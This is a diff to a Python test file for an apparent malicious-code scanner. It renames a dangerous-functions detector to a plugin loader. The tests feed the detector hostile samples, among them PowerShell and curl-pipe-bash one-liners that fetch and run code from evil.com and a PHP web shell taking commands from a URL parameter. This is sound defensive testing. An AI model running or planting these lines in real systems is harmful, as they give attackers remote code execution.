@@ -19,7 +19,7 @@ from suscheck.modules.detectors.encoded_strings import detect_encoded_strings
 from suscheck.modules.detectors.network_indicators import detect_network_indicators
 from suscheck.modules.detectors.entropy import detect_high_entropy
 from suscheck.modules.detectors.credentials import detect_credentials
-from suscheck.modules.detectors.dangerous_functions import detect_dangerous_functions
+from suscheck.modules.detectors.plugin_loader import detect_plugins
 
 
 # ═══════════════════════════════════════════════════════════
@@ -89,7 +89,7 @@ class TestCodeScanner:
         result = CodeScanner().scan_file(str(f), language="python")
         assert set(result.detectors_ran) == {
             "encoded_strings", "network_indicators", "entropy",
-            "credentials", "dangerous_functions"
+            "credentials", "plugin_loader"
         }
 
     def test_scan_content_directly(self):
@@ -271,52 +271,52 @@ class TestCredentials:
 
 
 # ═══════════════════════════════════════════════════════════
-# Dangerous Functions Detector Tests
+# Layer 2 Plugins Detector Tests
 # ═══════════════════════════════════════════════════════════
 
-class TestDangerousFunctions:
+class TestLayer2Plugins:
     def test_python_eval(self):
         content = 'result = eval(user_input)'
-        findings = detect_dangerous_functions(content, "test.py", "python")
+        findings = detect_plugins(content, "test.py", "python")
         assert any("eval" in f.title.lower() for f in findings)
 
     def test_python_exec(self):
         content = 'exec(code_string)'
-        findings = detect_dangerous_functions(content, "test.py", "python")
+        findings = detect_plugins(content, "test.py", "python")
         assert any("exec" in f.title.lower() for f in findings)
 
     def test_python_subprocess(self):
         content = 'subprocess.call(cmd, shell=True)'
-        findings = detect_dangerous_functions(content, "test.py", "python")
+        findings = detect_plugins(content, "test.py", "python")
         assert len(findings) > 0
 
     def test_js_eval_atob(self):
         content = 'eval(atob("payload"));'
-        findings = detect_dangerous_functions(content, "test.js", "javascript")
+        findings = detect_plugins(content, "test.js", "javascript")
         assert len(findings) > 0
 
     def test_powershell_iex(self):
         content = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com")'
-        findings = detect_dangerous_functions(content, "test.ps1", "powershell")
+        findings = detect_plugins(content, "test.ps1", "powershell")
         assert len(findings) > 0
 
     def test_bash_curl_pipe(self):
         content = 'curl http://evil.com/payload.sh | bash'
-        findings = detect_dangerous_functions(content, "test.sh", "bash")
+        findings = detect_plugins(content, "test.sh", "bash")
         assert any("curl" in f.title.lower() or "download" in f.title.lower()
                     for f in findings)
 
     def test_clean_python_no_findings(self):
         content = 'def add(a, b):\n    return a + b\n'
-        findings = detect_dangerous_functions(content, "test.py", "python")
+        findings = detect_plugins(content, "test.py", "python")
         assert len(findings) == 0
 
     def test_php_system(self):
         content = '<?php system($_GET["cmd"]); ?>'
-        findings = detect_dangerous_functions(content, "test.php", "php")
+        findings = detect_plugins(content, "test.php", "php")
         assert len(findings) > 0
 
     def test_java_runtime_exec(self):
         content = 'Runtime.getRuntime().exec("cmd.exe");'
-        findings = detect_dangerous_functions(content, "Test.java", "java")
+        findings = detect_plugins(content, "Test.java", "java")
         assert len(findings) > 0
